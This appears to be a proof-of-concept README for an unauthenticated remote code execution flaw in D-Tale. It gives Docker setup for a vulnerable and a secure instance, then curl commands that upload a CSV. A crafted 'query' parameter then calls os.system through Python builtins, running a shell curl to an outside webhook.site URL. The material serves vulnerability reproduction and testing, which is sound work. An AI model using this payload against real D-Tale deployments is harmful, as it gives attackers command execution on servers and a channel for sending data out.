# Setup a D-Tale instance without needing of authentication(insecure)
```bash
cd vulnerable_dtale
docker build -t dtale-expose-ui .
docker run --rm --name dtale-vulnerable -p 40000:40000 dtale-expose-ui
```
# Setup a D-Tale instance with authentication enabled (secure)
```bash
cd secure_dtale
docker build -t dtale-secure .
docker run --rm --name dtale-secure -p 40000:40000 dtale-secure
```
Now use the following command to exploit the vulnerability
```bash
# upload sample data
curl -i 'http://127.0.0.1:40000/dtale/upload' \
  -X POST \
  -H 'Content-Type: multipart/form-data; boundary=-' \
  --data-binary \
  $'---\nContent-Disposition: form-data; name="data.csv"; filename="data.csv"\nContent-Type: text/csv\n\ntest,data\n\n---\nContent-Disposition: form-data; name="header"\n\ntrue\n---\nContent-Disposition: form-data; name="separatorType"\n\ncomma\n---\nContent-Disposition: form-data; name="separator"\n\n-----\n'
    # response: 200 OK, body: {"data_id":"a number","success":true}
  
# replace https://webhook with your webhook URL
curl -i -G \
  --data-urlencode 'query=@pd.core.frame.com.builtins.__import__("os").system("""curl https://webhook.site/ #""")' \
  'http://127.0.0.1:40000/dtale/chart-data/1'
# response: 200 OK, body: {"error":"'Series' object has no attribute 'columns....
```